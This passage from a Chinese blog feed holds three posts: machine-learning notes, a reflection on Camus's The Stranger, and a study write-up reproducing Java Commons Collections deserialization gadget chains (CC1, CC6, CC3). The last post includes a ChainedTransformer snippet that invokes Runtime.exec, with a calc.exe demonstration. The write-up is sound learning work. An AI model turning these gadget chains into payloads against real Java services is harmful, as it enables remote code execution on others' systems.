src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Qr2ybCcuiouDR8x1xyAcIK0LnQh.png"></p><h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><h4 id="梯度下降"><a href="#梯度下降" class="headerlink" title="梯度下降"></a>梯度下降</h4><p>在坡顶找一个下坡最快的位置走上一小步</p><p>学习率 α 太高导致跳过最低点，太低导致运行速度慢：寻找最大合理值</p><p>偏导数通过斜率来决定这一步走多长，随着接近局部最小值，变化率降低</p><p>如何检测是代码错误还是学习率不当？ –&gt; 将学习率设置的非常小来检查</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/EUF0blAYUog6FLxqK6McsrTAnAg.png"></p><p>检查是否收敛：j-迭代次数图或者自动收敛测试</p><h5 id="亚当算法（优化器）"><a href="#亚当算法（优化器）" class="headerlink" title="亚当算法（优化器）"></a>亚当算法（优化器）</h5><p>修改学习率</p><h4 id="正规方程"><a href="#正规方程" class="headerlink" title="正规方程"></a>正规方程</h4><p>无需迭代，但是只适用于线性回归 速度慢</p><h3 id="-2"><a href="#-2" class="headerlink" title=""></a></h3><h2 id="拟合问题"><a href="#拟合问题" class="headerlink" title="拟合问题"></a>拟合问题</h2><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/T49Gb1Wqlon1hKxoX25cQCA0nLm.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/EDbBbism1oFAEJxkDKPcj8W9no1.png"></p><h3 id="欠拟合（高偏差）-high-bias"><a href="#欠拟合（高偏差）-high-bias" class="headerlink" title="欠拟合（高偏差） high bias"></a>欠拟合（高偏差） high bias</h3><p>算法不准确</p><h3 id="泛化"><a href="#泛化" class="headerlink" title="泛化"></a>泛化</h3><p>让算法在处理未测试的数据集的时候仍有优秀的预测</p><h3 id="过拟合（高方差）-high-variance"><a href="#过拟合（高方差）-high-variance" class="headerlink" title="过拟合（高方差） high variance"></a>过拟合（高方差） high variance</h3><p>算法对数据集中所有数据精确处理但是失去了预测的能力</p><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/RJjvbf5ilojXJ0xWFu8ceFW9nSc.png"></p><h4 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h4><p>减少与增加</p><h4 id="多项式回归"><a href="#多项式回归" class="headerlink" title="多项式回归"></a>多项式回归</h4><p>改变 x 的次数</p><h4 id="增加数据集"><a href="#增加数据集" class="headerlink" title="增加数据集"></a>增加数据集</h4><p>一味地增加数据集效果有限，对高方差的效果会好</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ENppbIPl2oNdsVxhxU3c9WaxnNc.png"></p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/SPidbbN8kodoyqxaklhcaXQenHh.png"></p><p>特征选择：减少相关性弱的特征，避免多项式表达能力过强</p><h4 id="正则化"><a href="#正则化" class="headerlink" title="正则化"></a>正则化</h4><p>保留相关特征，减少权重</p><p>使用场景：特征多但是不能确认哪个特征是有用或者无用的 lambda 需要选择合适的大小</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/Jv6cbzReHonIutx3XtIca0fXn2N.png"></p><p>正则化线性回归梯度下降</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/ExehbmkdzoUmJrxkqggcqNq3nHh.png"></p><p>正则化逻辑回归梯度下降</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/SiX6bNCCOoEPOXxGow6c8eR7n4c.png"></p><h4 id="lambda"><a href="#lambda" class="headerlink" title="lambda"></a>lambda</h4><p>增大 lambda 导致模型简化</p><p><img src="/2023/10/14/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/IqLAbUt1SoRgZQxK2YLcvBQcnJe.png"></p><p>lambda 增大会导致 j train 不断增大（越来越偏离测试集）</p><p>lanbda 过大—过拟合  过小—近似常数方程</p><h3 id="诊断"><a href="#诊断" class="headerlink" title="诊断"></a>诊断</h3><p>训练：得到 j train 和多组已经完成了拟合的参数</p><p>选择模型（交叉验证）：得到 j cv 函数查看哪一组参数的误差小然后做出选择</p><p>测试：模拟现实情况来评估泛化能力</p><p>高偏差：在训练集上存在较大误差</p><p>高方差：j cv 远大于 j train 在交叉验证集中的误差远大于训练集上的误差（训练误差小，其他大）</p><p>高方差 + 高偏差：j cv 远大于 j train 而且 j train 很高</p><h1 id="-3"><a href="#-3" class="headerlink" title=""></a></h1><h2 id="-4"><a href="#-4" class="headerlink" title=""></a></h2>]]></content>
    
    
    <categories>
      
      <category>人工智能</category>
      
    </categories>
    
    
    <tags>
      
      <tag>人工智能</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《局外人》--意义</title>
    <link href="/2023/09/24/%E3%80%8A%E5%B1%80%E5%A4%96%E4%BA%BA%E3%80%8B-%E6%84%8F%E4%B9%89/"/>
    <url>/2023/09/24/%E3%80%8A%E5%B1%80%E5%A4%96%E4%BA%BA%E3%80%8B-%E6%84%8F%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<h2 id="面对荒诞的人生，是偶尔体会丧失意义的痛苦还是坚定地体会无意义感"><a href="#面对荒诞的人生，是偶尔体会丧失意义的痛苦还是坚定地体会无意义感" class="headerlink" title="面对荒诞的人生，是偶尔体会丧失意义的痛苦还是坚定地体会无意义感"></a>面对荒诞的人生，是偶尔体会丧失意义的痛苦还是坚定地体会无意义感</h2><p>　莫尔索在面对所有的关系，亲人，友情，爱情，与所有的社会规则，葬礼，婚礼，牢狱，工作，一句“我爱你”，他与所有人保持了绝对的距离，对一切漠不关心，冷漠麻木的同时又对外界绝对的真诚，从不弄虚作假。他坚定地站在了极致的虚无主义视角之下，面对终将孑然一身离开世界的荒诞，莫尔索认为，“我怎么样都可以”，如果我愿意，我可以与你交友，结婚。但是一切的实质都是没有意义的</p><hr><h3 id="意义之网的破碎"><a href="#意义之网的破碎" class="headerlink" title="意义之网的破碎"></a>意义之网的破碎</h3><p>  　我个人对于《局外人》第二段的感受并不深刻，而整个第一段都是在一种介于兴奋与迷茫的状态中看完的，大概是出于感同身受与对于作者可以给出答案的不信任。    </p><p>  　以高考为例，外界会不断地向高中的学生强调“好好学习才能拥有好的未来”。那么，应试教育的“学习”的意义在哪里呢？主流的答案是“考上好的大学”，然后呢？伴随而来的是好工作，好婚姻，好生活，这种模糊的答案或许能在一定程度上作为学习的支撑力，但是一旦受到一次偶然的审视，脆弱的意义之网便即刻破碎，留下的空洞会带来极大地痛苦与虚无感</p><h3 id="自欺式的意义"><a href="#自欺式的意义" class="headerlink" title="自欺式的意义"></a>自欺式的意义</h3><p>  　应试教育的本质–“为了筛选人才”而进行的手段，其最终目的并非“灌输知识”，但是当时的我无法承认消耗自己的大量时间精力的目的是“通过人才筛选”，于是自欺的为学习赋予了诸如“大学生活条件更优越”，“父母可以生活更好”这种相对而言具体却仍然虚无的意义</p><h3 id="重构世界"><a href="#重构世界" class="headerlink" title="重构世界"></a>重构世界</h3><p>  　莫尔索是否对于现代人的意义，就仅仅止步于提醒了人们社会的规则与人的关系本质上都是虚无？我认为他带来的是一种审视：<u><strong>重新审视我们所有的信念，价值，审视社会上所有规则</strong></u>，从而构筑坚定地世界观，莫尔索式的生活方式的前提也是**<u>深刻的认识到了生活的本质</u>**（但是我并未见到他所做出的选择，书中的表述更偏向于一种被动消极的方式）</p><hr><h3 id="个人思考"><a href="#个人思考" class="headerlink" title="个人思考"></a>个人思考</h3><h4 id="审视意义"><a href="#审视意义" class="headerlink" title="审视意义"></a>审视意义</h4><p>  　莫尔索深刻的认识到了虚无，他接受了虚无，被动的选择了冷漠的生活方式，重新审视“意义”一词，我们甚至可以讨论“意义”的“意义”是什么，“讨论意义”的“意义”是什么，意义一词却只是人类符号学为了交流所创造的一个词汇，我们更应该思考的东西无法直接用文字表述，</p><h4 id="上帝已死"><a href="#上帝已死" class="headerlink" title="上帝已死"></a>上帝已死</h4><p>  　上帝死去的那一刻，人们失去了宗教信仰所带来的强烈的精神力量，意义的定义权重新回到了“个人”身上，这也导致了当代的生活每个人的意义都可以由自己构筑，虽然资本（金钱）似乎取而代之，成为了铭刻在当代人心中的强烈精神支柱，消费主义成为了新的上帝，只是无法否认的是，消费所带来的满足并不如宗教信仰，个人也拥有了更多的机会去思考与构筑自身的意义，同时也导致了强烈的虚无</p><h4 id="何处寻求"><a href="#何处寻求" class="headerlink" title="何处寻求"></a>何处寻求</h4><p>  　正如面对做痛苦的苏格拉底还是快乐的猪的论题，需要获取生活中的大量素材并总结出自己的结论后才能将选择权握在自己手上，在实践与思考中反思世界观，面对生活的意义每个人都可以不尽相同，（包括明确的追求金钱也不失为一种选择）让人从无聊与痛苦的钟摆中拖出</p><h4 id="我"><a href="#我" class="headerlink" title="我"></a>我</h4><p>  　生活的意义被我构筑在<strong>趣味</strong>之上，任何我做出的行为都应该在<strong>不违背个人道德底线，不伤害他人利益</strong>的前提下尽可能的追求有趣（短暂性的欢愉与长期快乐的结合），同时我重视与他人的<strong>关系</strong>，（纵使我一度有严重的唯我论倾向，认为他人也是客体，如今我不可否认他人的主体性），我认为更多人共舞的生活会更加有趣（纵使不是所有人都有这个能力来追求生活的乐趣）</p><hr><br/><h3 id="方法论"><a href="#方法论" class="headerlink" title="方法论"></a>方法论</h3>]]></content>
    
    
    <categories>
      
      <category>阅读笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>阅读笔记</tag>
      
      <tag>think</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>java反序列化漏洞复现</title>
    <link href="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="JAVA反序列化分析思路"><a href="#JAVA反序列化分析思路" class="headerlink" title="JAVA反序列化分析思路"></a>JAVA反序列化分析思路</h1><p>从危险函数出发开始寻找不同类的同名函数实现任意方法调用（反射&#x2F;动态加载字节码）</p><h1 id="反射基础"><a href="#反射基础" class="headerlink" title="反射基础"></a>反射基础</h1><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/af6f7ed4fa494b017fd94674d1acac2b.png" class="" title="截图"><p>r是一个Runtime实例，c是一个Runtime类，对c使用反射（getMethod）来获取exec方法，然后在r上调用这个方法</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ApacheSerialize</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)        &#125;; <span class="hljs-comment">//将transformers数组存入ChaniedTransformer这个继承类    Transformer transformerChain = new ChainedTransformer(transformers);java</span><br></code></pre></td></tr></table></figure><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230141704455.png" class="" title="image-20241230141704455"><h3 id="transformer"><a href="#transformer" class="headerlink" title="transformer"></a>transformer</h3><p>InvokerTransformer（反射利用点）</p><p>首先是由InvokerTransformer类中的transform实现了任意方法调用的同时还在构造函数中导致参数可控<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/0decef64baffec427ca8503b6055d012.png" class="" title="截图"></p><p>上面的java反射就相当于</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/451006b45403e4916ae89c1bac57168c.png" class="" title="截图"><p>（实际上自己构造的时候在IDE中直接看需要填入的变量还是挺方便的，这里不太好看懂）</p><p>如以下语句就可以实现命令执行</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/797821b047a0aa1970d24586a60e6e61.png" class="" title="截图"><p><strong>将Runtime实例传入transfrom，cls就获取了Runtime类，method获取了Runtime类中的exec方法，然后对Runtime实例使用传入的传输calc</strong></p><p>poc如下<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/286bd714c894d8bf2db07f8f04e02323.png" class="" title="截图"></p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/63a36712d33061393ef3aa3974c6e165.png" class="" title="截图"> <p>最后的目标是回到readObject，所以此时要寻找不同的方法来调用transform</p><hr><h3 id="MAP"><a href="#MAP" class="headerlink" title="MAP"></a><strong>MAP</strong></h3><p>在TransformedMap类里面可以找到调用了transfrom方法的位置</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/78ce747963117a1a74432392b4fae2c8.png" class="" title="截图"><p>而valueTransformer是TransformedMap构造函数中的一部分，也就是可控<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/fdb06310411b2b8c0eb1c15a9bd010a4.png" class="" title="截图"></p><p>如下构造就可以对invokerTransformer调用tansform方法（由于构造函数是保护的，这里用到decorate装饰器）</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/bbcf05b0825c29bc8168c9b99b41ed4f.png" class="" title="截图"><p>继续向上寻找发现是TransformedMap的父类的MapEntry类重写了setValue方法</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1858e0f761cc2bc3e7092ea2b0a6a5ed.png" class="" title="截图"><p>则可以如下，构造一个TransformedMap并且调用setValue即可（让TransformedMap的value为构造的invokertransformer然后通过setValue调用transform）<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/5cfdd45bdae2b2417775ed46616fd7e6.png" class="" title="截图"></p><p>现在则需要一个可以遍历数组的地方并且需要value可控或者不同名的调用了setValue</p><hr><h3 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a><strong>AnnotationInvocationHandler</strong></h3><p>pop链的最后一步<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/3b63106246b1c42b6b3edf765722022d.png" class="" title="截图"></p><p>满足两个if条件后即可调用setvalue</p><p><strong>但是这个类是一个default类，需要用反射创建，并且可以看见他的构造函数中的第一个参数是一个注解类（如Override）</strong><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/1e001eb8613399c766028cca2208c03f.png" class="" title="截图"></p><p>此时有三个问题：</p><p><strong>1.如何通过if判断来进入这个setvalue中</strong></p><p><strong>2.setValue貌似不可控</strong></p><p><strong>3.Runtime对象本身是不可序列化的，需要通过反射</strong></p><hr><p><strong>Runtime实现反射调用</strong></p><p><u><strong>解决Runtime不可序列化的问题</strong></u><br>正常情况，由于Runtime对象构造函数是私有的，需要通过getRuntime方法来获取这个对象</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/e50396f2a799915ae1a443566d136c8a.png" class="" title="截图"><p>上图，<u><strong>通过.class获取了Runtime类，然后getMethod反射获取getRuntime方法，然后调用这个方法，获取r这个Runtime实例化对象，最后反射获取exec方法并且在r上调用</strong></u></p><p>转换为InvokerTransform类中则是</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/c98fce6b6222229e8bc9037b6b53c8bb.png" class="" title="截图"><p><strong>chainedtransformer</strong></p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ff2051707c278f1d4568df83e5ec4438.png" class="" title="截图"><p>这时候通过chainedtransform实现循环调用来使得调用更加简洁</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ade26093c15bbd94bc93ae52b3c6e75e.png" class="" title="截图"><hr><p><strong>进入if语句</strong></p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/13d3c235cdee3f76a831e4b5adcf462f.png" class="" title="截图"><p>1.通过getKey来获取传入的memberValue中的键是否存在于menberTypes中</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/950f13a925722aa8a01ef421ce1c21bc.png" class="" title="截图"><p>如上，反序列化入口获取了type参数也就是下面的Override.class<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/96228eadb7d6edc8fcf4d351ebcbdd06.png" class="" title="截图"></p><p>接着获取了这个类中的成员方法，检查poc中传入的键在这个类中的成员方法终会是否存在</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/85b2366957f5b394f8191f99fefe59a2.png" class="" title="截图"><p>则传入一个有成员方法的类并且将key改成他的一个方法名</p><p>如Target的value方法<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/51cc8f6c209cda4b5236f950aae54f76.png" alt="截图"></p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/346ac98b2858372421dd9a0f353b66e2.png" class="" title="截图">如上修改即可<p>2.<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2814ca791e8398adc40537133b3e1e50.png" class="" title="截图"></p><p>即检查是否可以强转，这里不需要绕过</p><hr><p><strong>实现可控SetValue</strong></p><p>正常而言，这里会调用</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/60e389a8a285f78d23d2860b183d2f89.png" class="" title="截图"><p>也就是这里的transform的value不可控<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/8fb0727ffebea79221cd577f1550031b.png" class="" title="截图"></p><p>也就相当于要把下面的语句换成上面的语句（实现value可控）</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/2f8471b5faf8e18282ad8fc0167cc2b1.png" class="" title="截图"><p><strong>ConstantTransformer</strong></p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ff2051707c278f1d4568df83e5ec4438.png" class="" title="截图"><p>其transformer方法直接返回自身的一个变量同时可控<br>就可以利用它通过Runtime.getRuntime()创建一个Runtime实例</p><p>此时即可转换成poc中的</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/255b549250c082d6699e738adcbddce0.png" class="" title="截图"><hr><p> <strong>pop链回溯</strong></p><p>通过反射实例化了AnnotationInvocationHandler类—&gt;对他的value遍历并且调用setvalue，调用TransformedMap的父类的MapEntry#SetValue–&gt;transform方法(这一步为了实现可控SetValue借助到ConstantTransformer类)—&gt;在value中，我们恶意构造的chainTransformer类实现命令执行</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第一次看java的链子，看了点反射跟基本语法就强行看完了，感觉看懂了但是让自己复现还是很困难（语法不清晰），写的逻辑不太清晰</p><p>注意：以上的链子是利用TransformedMap回调调用+AnnotationInvocationHandler类调用SetValue来到transfrom方法，YSO链子的Lazymap需要利用动态代理</p><p>本质上TransformedMap和Lazymap都只是一个<strong>装饰器</strong>，TransformedMap是回调调用（新加入一个键值对的时候调用transform） LazyMap是懒加载（get找不到值的时候去触发transform）</p><h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>为了解决sun.reflect.annotation.AnnotationInvocationHandler#readObject在8u71后的变化(不再直接调用自定义的map而是弄了一个LinkedHashMap)</p><h3 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h3><p>首先看一下LazyMap，他的get方法调用了transform</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230144141189.png" class="" title="image-20241230144141189"><p>又回到了如何调用<strong>LazyMap#get</strong>（cc1demo利用的是Hashmap，yso的链子用的是动态代理调用lazymap）的问题，这里利用了<strong>TiedMapEntry</strong>#getValue，</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230123902078.png" class="" title="image-20241230123902078"><p>hashCode方法调用了getValue<img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230123941432.png" class="" title="image-20241230123941432"></p><p>hashmap的hash方法调用了hashcode</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230124520441.png" class="" title="image-20241230124520441"><p>他的readObject方法又调用了hash方法</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230124322406.png" class="" title="image-20241230124322406"><p>则得到链子</p><figure class="highlight leaf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs leaf">Hashmap#readObject--&gt;Hashmap<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">hash</span><span class="hljs-params">(<span class="hljs-variable">key</span>)</span></span>--&gt;TiedMapEntry#hashcode--&gt;TiedMapEntry<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">getValue</span><span class="hljs-params">(<span class="hljs-variable">key</span>)</span></span>--&gt;LazyMap#get<br></code></pre></td></tr></table></figure><p>同样写一个chain，decorate绑定到outputmap上面</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230123640842.png" class="" title="image-20241230123640842"><p>再把这个恶意的map绑定到TME的key上，最后构造一个hashmap，将TME放到他的key上</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230125549587.png" class="" title="image-20241230125549587"><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>调试发现，反序列化的时候并没有进入tranfrom方法，在map中判断存在这个叫做keykey的key</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230152230884.png" class="" title="image-20241230152230884"><p>这是因为hashmap#put的时候触发了对TME的hash操作</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230152606169.png" class="" title="image-20241230152606169"><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230152543096.png" class="" title="image-20241230152543096"><p>所以最后添加上remove操作</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230152825431.png" class="" title="image-20241230152825431"><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>跟cc1很像的链子，主要是这次分析换成了LazyMap,绕过了jdk8u71</p><h2 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h2><h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><p>利用字节码打的cc链</p><p>首先记住 可以通过newTransformer和getOutputProperties来RCE</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230173809708.png" class="" title="image-20241230173809708"><p>cc3的关键在于TrAXFilter类的构造方法调用了newTransformer来绕过InvokerTransformer的限制</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230172546356.png" class="" title="image-20241230172546356"><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230172657803.png" class="" title="image-20241230172657803"><p>至于如何调用这个类的构造方法，利用类InstantiateTransformer</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230172751878.png" class="" title="image-20241230172751878"><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230173957903.png" class="" title="image-20241230173957903"><p>需要保证name为空 给class赋值</p><img src="/2023/09/24/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20241230174043718.png" class="" 